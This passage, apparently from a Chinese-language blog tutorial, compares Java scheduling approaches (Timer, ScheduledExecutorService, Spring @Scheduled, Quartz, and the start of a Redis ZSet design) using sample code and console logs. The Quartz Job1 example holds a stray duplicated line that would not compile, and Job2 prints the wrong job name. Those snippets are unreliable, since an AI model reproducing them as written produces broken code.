</span><br><span class=\"line\">Task2 start, time = Wed Apr 14 15:31:20 CST 2021, thread id = 12 </span><br><span class=\"line\">Task2 finished, time = Wed Apr 14 15:31:23 CST 2021, thread id = 12 </span><br><span class=\"line\">Task1 start, time = Wed Apr 14 15:31:23 CST 2021, thread id = 12 </span><br><span class=\"line\">Task1 finished, time = Wed Apr 14 15:31:27 CST 2021, thread id = 12 </span><br><span class=\"line\">Task2 start, time = Wed Apr 14 15:31:27 CST 2021, thread id = 12 </span><br></pre></td></tr></table></figure><br>可以观察到<code>TimerTask1</code>执行间隔时间达到了7s。</p>\n<p>如果某个<code>TimerTask</code>执行的过程中抛出了异常，还会干扰其他任务的执行,这里再<code>TimerTask1</code>里除0模拟抛出异常：<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">    System.out.println(<span class=\"string\">&quot;main thread id = &quot;</span> + Thread.currentThread().getId());</span><br><span class=\"line\">    Timer timer = <span class=\"keyword\">new</span> Timer();</span><br><span class=\"line\"></span><br><span class=\"line\">    TimerTask timerTask1 = <span class=\"keyword\">new</span> TimerTask() &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">            <span class=\"comment\">//implement your code here</span></span><br><span class=\"line\">            System.out.printf(<span class=\"string\">&quot;Task1 start, time = %s, thread id = %s \\n&quot;</span>, <span class=\"keyword\">new</span> Date().toString(), Thread.currentThread().getId());</span><br><span class=\"line\">            <span class=\"comment\">//Exception here!</span></span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                TimeUnit.SECONDS.sleep(<span class=\"number\">4</span>);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            System.out.println(<span class=\"number\">6</span>/<span class=\"number\">0</span>); </span><br><span class=\"line\">            System.out.printf(<span class=\"string\">&quot;Task1 finished, time = %s, thread id = %s \\n&quot;</span>, <span class=\"keyword\">new</span> Date().toString(), Thread.currentThread().getId());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    TimerTask timerTask2 = <span class=\"keyword\">new</span> TimerTask() &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">            <span class=\"comment\">//implement your code here</span></span><br><span class=\"line\">            System.out.printf(<span class=\"string\">&quot;Task2 start, time = %s, thread id = %s \\n&quot;</span>, <span class=\"keyword\">new</span> Date().toString(), Thread.currentThread().getId());</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                TimeUnit.SECONDS.sleep(<span class=\"number\">3</span>);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            System.out.printf(<span class=\"string\">&quot;Task2 finished, time = %s, thread id = %s \\n&quot;</span>, <span class=\"keyword\">new</span> Date().toString(), Thread.currentThread().getId());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    System.out.printf(<span class=\"string\">&quot;Timer ready to schedule, time = %s \\n&quot;</span>,<span class=\"keyword\">new</span> Date().toString());</span><br><span class=\"line\">    timer.schedule(timerTask1,<span class=\"number\">1000</span>,<span class=\"number\">1000</span>);</span><br><span class=\"line\">    timer.schedule(timerTask2,<span class=\"number\">1000</span>,<span class=\"number\">1000</span>);</span><br><span class=\"line\">    System.out.printf(<span class=\"string\">&quot;Timer doesn&#x27;t block main thread, time = %s \\n&quot;</span>, <span class=\"keyword\">new</span> Date().toString());</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>这次执行直接报错退出了：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">main thread id = 1</span><br><span class=\"line\">Timer ready to schedule, time = Wed Apr 14 15:37:36 CST 2021 </span><br><span class=\"line\">Timer doesn&#x27;t block main thread, time = Wed Apr 14 15:37:36 CST 2021 </span><br><span class=\"line\">Task1 start, time = Wed Apr 14 15:37:37 CST 2021, thread id = 12 </span><br><span class=\"line\">Exception in thread &quot;Timer-0&quot; java.lang.ArithmeticException: / by zero</span><br><span class=\"line\">\tat TestTimer$1.run(TimerTest.java:15)</span><br><span class=\"line\">\tat java.util.TimerThread.mainLoop(Timer.java:555)</span><br><span class=\"line\">\tat java.util.TimerThread.run(Timer.java:505)</span><br></pre></td></tr></table></figure><br>由于<code>TimerTask</code>抛出异常会直接把所有参与调度的任务一起拖死，再编程的时候必须对<code>run()</code>方法内的代码<code>try</code>，<code>catch</code>。</p>\n<p><strong>总结</strong>：使用<code>Timer</code>处理定时任务实现简单，但是存在以下问题：</p>\n<ul>\n<li>任务执行时间长影响其他任务</li>\n<li>任务异常影响其他任务</li>\n</ul>\n<h2 id=\"ScheduledExecutorService\"><a href=\"#ScheduledExecutorService\" class=\"headerlink\" title=\"ScheduledExecutorService\"></a>ScheduledExecutorService</h2><p><code>ScheduledExecutorService</code>再JDK1.5后引入，可以替代<code>Timer</code>的功能，并解决了<code>Timer</code>面对的一切问题。</p>\n<p>直接测试<code>Timer</code>存在的问题的例子，由三个任务，每个任务都需要运行4s，运行间隔分别为3s，4s，5s：<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">    System.out.println(<span class=\"string\">&quot;main thread id = &quot;</span> + Thread.currentThread().getId());</span><br><span class=\"line\">    ScheduledExecutorService scheduledExecutorService = Executors.newScheduledThreadPool(<span class=\"number\">10</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    scheduledExecutorService.scheduleAtFixedRate(() -&gt; &#123;</span><br><span class=\"line\">        <span class=\"comment\">//implement your code here</span></span><br><span class=\"line\">        System.out.printf(<span class=\"string\">&quot;Task1 start, time = %s, thread id = %s \\n&quot;</span>, <span class=\"keyword\">new</span> Date().toString(), Thread.currentThread().getId());</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            TimeUnit.SECONDS.sleep(<span class=\"number\">4</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        System.out.println(<span class=\"number\">6</span>/<span class=\"number\">0</span>);</span><br><span class=\"line\">        System.out.printf(<span class=\"string\">&quot;Task1 finished, time = %s, thread id = %s \\n&quot;</span>, <span class=\"keyword\">new</span> Date().toString(), Thread.currentThread().getId());</span><br><span class=\"line\">    &#125;, <span class=\"number\">1</span>, <span class=\"number\">3</span>, TimeUnit.SECONDS); <span class=\"comment\">//delay 1s, period 3s</span></span><br><span class=\"line\"></span><br><span class=\"line\">    scheduledExecutorService.scheduleAtFixedRate(() -&gt; &#123;</span><br><span class=\"line\">        <span class=\"comment\">//implement your code here</span></span><br><span class=\"line\">        System.out.printf(<span class=\"string\">&quot;Task2 start, time = %s, thread id = %s \\n&quot;</span>, <span class=\"keyword\">new</span> Date().toString(), Thread.currentThread().getId());</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            TimeUnit.SECONDS.sleep(<span class=\"number\">4</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        System.out.printf(<span class=\"string\">&quot;Task2 finished, time = %s, thread id = %s \\n&quot;</span>, <span class=\"keyword\">new</span> Date().toString(), Thread.currentThread().getId());</span><br><span class=\"line\">    &#125;, <span class=\"number\">1</span>, <span class=\"number\">4</span>, TimeUnit.SECONDS); <span class=\"comment\">//delay 1s, period 4s</span></span><br><span class=\"line\"></span><br><span class=\"line\">    scheduledExecutorService.scheduleAtFixedRate(() -&gt; &#123;</span><br><span class=\"line\">        <span class=\"comment\">//implement your code here</span></span><br><span class=\"line\">        System.out.printf(<span class=\"string\">&quot;Task3 start, time = %s, thread id = %s \\n&quot;</span>, <span class=\"keyword\">new</span> Date().toString(), Thread.currentThread().getId());</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            TimeUnit.SECONDS.sleep(<span class=\"number\">4</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        System.out.printf(<span class=\"string\">&quot;Task3 finished, time = %s, thread id = %s \\n&quot;</span>, <span class=\"keyword\">new</span> Date().toString(), Thread.currentThread().getId());</span><br><span class=\"line\">    &#125;, <span class=\"number\">1</span>, <span class=\"number\">5</span>, TimeUnit.SECONDS); <span class=\"comment\">//delay 1s, period 5s</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>控制台结果如下：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">main thread id = 1</span><br><span class=\"line\">Task1 start, time = Wed Apr 14 16:05:05 CST 2021, thread id = 12 </span><br><span class=\"line\">Task3 start, time = Wed Apr 14 16:05:05 CST 2021, thread id = 14 </span><br><span class=\"line\">Task2 start, time = Wed Apr 14 16:05:05 CST 2021, thread id = 13 </span><br><span class=\"line\">Task3 finished, time = Wed Apr 14 16:05:09 CST 2021, thread id = 14 </span><br><span class=\"line\">Task2 finished, time = Wed Apr 14 16:05:09 CST 2021, thread id = 13 </span><br><span class=\"line\">Task2 start, time = Wed Apr 14 16:05:09 CST 2021, thread id = 12 </span><br><span class=\"line\">Task3 start, time = Wed Apr 14 16:05:10 CST 2021, thread id = 14 </span><br><span class=\"line\">Task2 finished, time = Wed Apr 14 16:05:13 CST 2021, thread id = 12 </span><br><span class=\"line\">Task2 start, time = Wed Apr 14 16:05:13 CST 2021, thread id = 13 </span><br><span class=\"line\">Task3 finished, time = Wed Apr 14 16:05:14 CST 2021, thread id = 14 </span><br><span class=\"line\">Task3 start, time = Wed Apr 14 16:05:15 CST 2021, thread id = 16 </span><br><span class=\"line\">Task2 finished, time = Wed Apr 14 16:05:17 CST 2021, thread id = 13 </span><br><span class=\"line\">Task2 start, time = Wed Apr 14 16:05:17 CST 2021, thread id = 17 </span><br><span class=\"line\">Task3 finished, time = Wed Apr 14 16:05:19 CST 2021, thread id = 16 </span><br><span class=\"line\">Task3 start, time = Wed Apr 14 16:05:20 CST 2021, thread id = 12 </span><br><span class=\"line\">Task2 finished, time = Wed Apr 14 16:05:21 CST 2021, thread id = 17 </span><br><span class=\"line\">Task2 start, time = Wed Apr 14 16:05:21 CST 2021, thread id = 18 </span><br><span class=\"line\">Task3 finished, time = Wed Apr 14 16:05:24 CST 2021, thread id = 12 </span><br><span class=\"line\">Task3 start, time = Wed Apr 14 16:05:25 CST 2021, thread id = 12 </span><br><span class=\"line\">Task2 finished, time = Wed Apr 14 16:05:25 CST 2021, thread id = 18 </span><br><span class=\"line\">Task2 start, time = Wed Apr 14 16:05:25 CST 2021, thread id = 18 </span><br><span class=\"line\">Task3 finished, time = Wed Apr 14 16:05:29 CST 2021, thread id = 12 </span><br><span class=\"line\">Task2 finished, time = Wed Apr 14 16:05:29 CST 2021, thread id = 18 </span><br></pre></td></tr></table></figure><br>可以看出<code>Task2</code>严格按照设定的4s一次的速率被执行，<code>Task3</code>严格按照5s一次的速率执行，尽管执行时间达到了4s也没有干涉到其他任务。<code>Task1</code>中发生了除0异常，直接退出了，没有在后续任务中出现，也没有影响到<code>Task2</code>和<code>Task3</code>的后续执行。</p>\n<p>观察可以看出每次调度一个<code>Task</code>线程ID都在变化，这是因为<code>ScheduledExecutorService</code>维护了一个线程池。</p>\n<p><strong>总结</strong>：<code>ScheduledExecutorService</code>通过维护一个线程池，使得调度的任务之间相互不影响，可以完全取代<code>Timer</code>。</p>\n<h2 id=\"SpringTask\"><a href=\"#SpringTask\" class=\"headerlink\" title=\"SpringTask\"></a>SpringTask</h2><p>如果业务用到了Spring，可以直接用Spring提供的SpringTask实现定时任务。只需要在启动类上加上<code>@EnableScheduling</code>注解即可，添加定时任务时给方法加上<code>@Scheduled</code>注解即可：<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Component</span> <span class=\"comment\">// must be declared!!!</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TaskDemo</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Scheduled(cron = &quot;* * * * * *&quot;)</span> <span class=\"comment\">//execute per sec</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">runTask</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;Task Start&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p><code>@Scheduled</code>中用6分段crontab表达式（秒 分 时 日 月 星）描述执行时间</p>\n</blockquote>\n<h2 id=\"Quartz\"><a href=\"#Quartz\" class=\"headerlink\" title=\"Quartz\"></a>Quartz</h2><p>Quartz是Java一个比较成熟的定时任务框架，他提供了额外的作业调度管理。</p>\n<p>首先引入Maven依赖：<br><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- https://mvnrepository.com/artifact/org.quartz-scheduler/quartz --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.quartz-scheduler<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>quartz<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>2.3.0<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><br>Quartz执行定时任务主要涉及三个类/接口：</p>\n<ul>\n<li><code>Job</code></li>\n<li><code>Scheduler</code></li>\n<li><code>Trigger</code></li>\n</ul>\n<p>其中<code>Job</code>是一个接口，业务逻辑实现在<code>Job</code>的<code>execute()</code>中，每个定时任务对应一个<code>Job</code>。<code>Trigger</code>也是一个接口，用于定义任务的触发时间，<code>Tigger</code>有多个默认实现：<code>SimpleTrigger</code>、<code>CronTigger</code>等。<code>Scheduler</code>是一个调度器接口，也提供了多个默认实现。<code>Scheduler</code>用于把<code>Job</code>和<code>Trigger</code>结合起来参与调度：<br><img src=\"1.png\" alt=\"\"></p>\n<p>以下是一个具体例子：首先实现两个Job，<code>Job1</code>、<code>Job2</code>，实现<code>Job</code>接口。<code>Job2</code>中模拟了除0异常。<code>JobExecutionContext</code>中包含了Quartz运行时的环境以及<code>Job</code>本身的详细数据信息。<br>当<code>Schedule</code>调度执行一个<code>Job</code>的时候，就会将<code>JobExecutionContext</code>传递给该<code>Job</code>的<code>execute()</code>中，<code>Job</code>就可以通过<code>JobExecutionContext</code>对象获取信息。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Job1</span> <span class=\"keyword\">implements</span> <span class=\"title\">Job</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">execute</span><span class=\"params\">(JobExecutionContext jobExecutionContext)</span> <span class=\"keyword\">throws</span> JobExecutionException </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//implement your code here</span></span><br><span class=\"line\">        System.out.printf(<span class=\"string\">&quot;Job1 start, time = %s, thread id = %s \\n&quot;</span>, <span class=\"keyword\">new</span> Date().toString(), Thread.currentThread().getId()); </span><br><span class=\"line\">        Date().toString(), Thread.currentThread().getId());</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            TimeUnit.SECONDS.sleep(<span class=\"number\">3</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        System.out.printf(<span class=\"string\">&quot;Job1 finished, time = %s, thread id = %s \\n&quot;</span>, <span class=\"keyword\">new</span> Date().toString(), Thread.currentThread().getId());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>Job2</code>是一个会出现异常的任务：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Job2</span> <span class=\"keyword\">implements</span> <span class=\"title\">Job</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">execute</span><span class=\"params\">(JobExecutionContext jobExecutionContext)</span> <span class=\"keyword\">throws</span> JobExecutionException </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//implement your code here</span></span><br><span class=\"line\">        System.out.printf(<span class=\"string\">&quot;Job2 start, time = %s, thread id = %s \\n&quot;</span>, <span class=\"keyword\">new</span> Date().toString(), Thread.currentThread().getId());</span><br><span class=\"line\">        System.out.println(<span class=\"number\">1</span>/<span class=\"number\">0</span>); <span class=\"comment\">//simulate exception</span></span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            TimeUnit.SECONDS.sleep(<span class=\"number\">4</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        System.out.printf(<span class=\"string\">&quot;Job1 finished, time = %s, thread id = %s \\n&quot;</span>, <span class=\"keyword\">new</span> Date().toString(), Thread.currentThread().getId());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>main</code>函数中用<code>StdSchedulerFactory</code>创建一个<code>StdScheduler</code>。每个<code>Job</code>需要用<code>JobDetail</code>实例化并绑定，<code>JobDetail</code>给<code>Job</code>提供了额外属性：<code>name</code>，<code>group</code>。<code>Job</code>和<code>JobDetail</code>分离的设计使得每次<code>Scheduler</code>执行都会创建一个新的<code>Job</code>实例，防止了对<code>Job</code>的并发访问。每个<code>Trigger</code>也可以设置<code>name</code>和<code>group</code>，<code>tigger1</code>用<code>SimpleTigger</code>实现，<code>tigger2</code>使用<code>CronTrigger</code>实现，支持7段式（秒 分 时 日 月 星 年）的crontab表达式。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> SchedulerException, InterruptedException </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 1、create scheduler</span></span><br><span class=\"line\">    Scheduler scheduler = <span class=\"keyword\">new</span> StdSchedulerFactory().getScheduler();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 2、bind job to jobDetail</span></span><br><span class=\"line\">    JobDetail jobDetail1 = JobBuilder.newJob(Job1.class)</span><br><span class=\"line\">            .withIdentity(<span class=\"string\">&quot;job1&quot;</span>, <span class=\"string\">&quot;group1&quot;</span>)</span><br><span class=\"line\">            .build();</span><br><span class=\"line\">    JobDetail jobDetail2 = JobBuilder.newJob(Job2.class)</span><br><span class=\"line\">            .withIdentity(<span class=\"string\">&quot;job2&quot;</span>, <span class=\"string\">&quot;group1&quot;</span>)</span><br><span class=\"line\">            .build();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 3. set trigger to invoke job per sec</span></span><br><span class=\"line\">    Trigger trigger1 = TriggerBuilder.newTrigger()</span><br><span class=\"line\">            .withIdentity(<span class=\"string\">&quot;trigger1&quot;</span>, <span class=\"string\">&quot;triggerGroup1&quot;</span>)</span><br><span class=\"line\">            .startNow()<span class=\"comment\">//立即生效</span></span><br><span class=\"line\">            .withSchedule(SimpleScheduleBuilder.simpleSchedule()</span><br><span class=\"line\">                    .withIntervalInSeconds(<span class=\"number\">1</span>)<span class=\"comment\">//invoke this job per sec</span></span><br><span class=\"line\">                    .repeatForever()).build();</span><br><span class=\"line\"></span><br><span class=\"line\">    Trigger trigger2 = TriggerBuilder.newTrigger()</span><br><span class=\"line\">            .withIdentity(<span class=\"string\">&quot;trigger2&quot;</span>, <span class=\"string\">&quot;triggerGroup1&quot;</span>)</span><br><span class=\"line\">            .startNow()</span><br><span class=\"line\">            .withSchedule(CronScheduleBuilder.cronSchedule(<span class=\"string\">&quot;* * * * * ? *&quot;</span>)) <span class=\"comment\">//invoke this job per sec</span></span><br><span class=\"line\">            .build();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//4、execute</span></span><br><span class=\"line\">    scheduler.scheduleJob(jobDetail1, trigger1);</span><br><span class=\"line\">    scheduler.scheduleJob(jobDetail2, trigger2);</span><br><span class=\"line\">    System.out.println(<span class=\"string\">&quot;--------scheduler start ! ------------&quot;</span>);</span><br><span class=\"line\">    scheduler.start();</span><br><span class=\"line\"></span><br><span class=\"line\">    System.out.println(<span class=\"string\">&quot;scheduler.start() won&#x27;t block this thread!&quot;</span>);</span><br><span class=\"line\">    TimeUnit.SECONDS.sleep(<span class=\"number\">5</span>);</span><br><span class=\"line\">    scheduler.shutdown();</span><br><span class=\"line\">    System.out.println(<span class=\"string\">&quot;--------scheduler shutdown ! ------------&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>控制台输出如下：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">--------scheduler start ! ------------</span><br><span class=\"line\">scheduler.start() won&#x27;t block this thread!</span><br><span class=\"line\">Job1 start, time = Thu Apr 15 10:34:49 CST 2021, thread id = 12 </span><br><span class=\"line\">Job2 start, time = Thu Apr 15 10:34:49 CST 2021, thread id = 13 </span><br><span class=\"line\">Job1 start, time = Thu Apr 15 10:34:50 CST 2021, thread id = 14 </span><br><span class=\"line\">Job2 start, time = Thu Apr 15 10:34:50 CST 2021, thread id = 15 </span><br><span class=\"line\">Job1 start, time = Thu Apr 15 10:34:51 CST 2021, thread id = 16 </span><br><span class=\"line\">Job2 start, time = Thu Apr 15 10:34:51 CST 2021, thread id = 17 </span><br><span class=\"line\">Job1 start, time = Thu Apr 15 10:34:52 CST 2021, thread id = 18 </span><br><span class=\"line\">Job2 start, time = Thu Apr 15 10:34:52 CST 2021, thread id = 19 </span><br><span class=\"line\">Job1 finished, time = Thu Apr 15 10:34:52 CST 2021, thread id = 12 </span><br><span class=\"line\">Job1 start, time = Thu Apr 15 10:34:53 CST 2021, thread id = 20 </span><br><span class=\"line\">Job1 finished, time = Thu Apr 15 10:34:53 CST 2021, thread id = 14 </span><br><span class=\"line\">Job2 start, time = Thu Apr 15 10:34:53 CST 2021, thread id = 21 </span><br><span class=\"line\">Job1 finished, time = Thu Apr 15 10:34:54 CST 2021, thread id = 16 </span><br><span class=\"line\">Job1 start, time = Thu Apr 15 10:34:54 CST 2021, thread id = 13 </span><br><span class=\"line\">Job2 start, time = Thu Apr 15 10:34:54 CST 2021, thread id = 15 </span><br><span class=\"line\">--------scheduler shutdown ! ------------</span><br><span class=\"line\">Job1 finished, time = Thu Apr 15 10:34:55 CST 2021, thread id = 18 </span><br><span class=\"line\">Job1 finished, time = Thu Apr 15 10:34:56 CST 2021, thread id = 20 </span><br><span class=\"line\">Job1 finished, time = Thu Apr 15 10:34:57 CST 2021, thread id = 13 </span><br><span class=\"line\"></span><br><span class=\"line\">Process finished with exit code 0</span><br></pre></td></tr></table></figure><br>可以看出Quartz实现的定时任务，每个任务会严格按照设置的时间执行，不会因为执行时间超时或异常影响其他任务。每次执行任务的线程ID各不相同，说明<code>Scheduler</code>也是基于线程池设计的，维护<code>QuartzSchedulerThread</code>，使各个任务线程相互独立。当某个任务抛出异常，还会被再次执行。<code>scheduler.start()</code>不会阻塞主线程，需要用<code>scheduler.shutdown()</code>停止调度。当请求停止调度后，主线程会等待当前在执行的所有任务完成后再退出。</p>\n<p>需要保证每个<code>Trigger</code>只能对应一个任务，<code>QuartzScheduler</code>会检查<code>JobDetail</code>和<code>Trigger</code>的key：<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (trigger.getJobKey() == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">    trig.setJobKey(jobDetail.getKey());</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (!trigger.getJobKey().equals(jobDetail.getKey())) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> SchedulerException(<span class=\"string\">&quot;Trigger does not reference given job!&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>如果一样，会跑出”Trigger does not reference given job!”错误。</p>\n<p><strong>总结</strong>：Quartz是一个比较完美的定时任务框架，需要额外引入依赖。如果对业务稳定有较高要求，可以用Quartz。</p>\n<h2 id=\"Redis\"><a href=\"#Redis\" class=\"headerlink\" title=\"Redis\"></a>Redis</h2><p>上面的方法都是关于单机定时任务的实现，如果是以下场景：</p>\n<ul>\n<li>给新注册的用户一周后发送一封邮件</li>\n<li>给火车票在发车后检查车票状态</li>\n</ul>\n<p>这些业务的数据量巨大，给每个任务都在内存中设置定时器不现实，而且一旦定时任务模块退出还会丢失定时信息。这种情况下可以使用Redis来实现分布式系统定时任务，将<code>Trigger</code>和<code>Job</code>分开。使用Redis实现延迟任务的方法大体可分为两类：通过ZSet的方式和键空间通知的方式。</p>\n<p>添加Maven的Redis依赖：<br><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>redis.clients<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>jedis<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>2.7.1<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<ol>\n<li>ZSet实现方式<br>通过ZSet实现定时任务的思路是，将定时任务存放到ZSet集合中，并且将过期时间存储到ZSet的<code>Score</code>字段中，然后通过一个无限循环来判断当前时间内是否有需要执行的定时任务，如果有则进行执行，具体实现代码如下：<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">RedisScheduleDemo</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// zset key</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> String _KEY = <span class=\"string\">&quot;redisTask&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">static</span> Jedis jedis = <span class=\"keyword\">new</span> Jedis(<span class=\"string\">&quot;localhost&quot;</span>,<span class=\"number\">6379</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> InterruptedException </span>&#123;</span><br><span class=\"line\">        jedis.zadd(_KEY, Instant.now().plusSeconds(<span class=\"number\">11</span>).getEpochSecond(), <span class=\"string\">&quot;function1&quot;</span>);</span><br><span 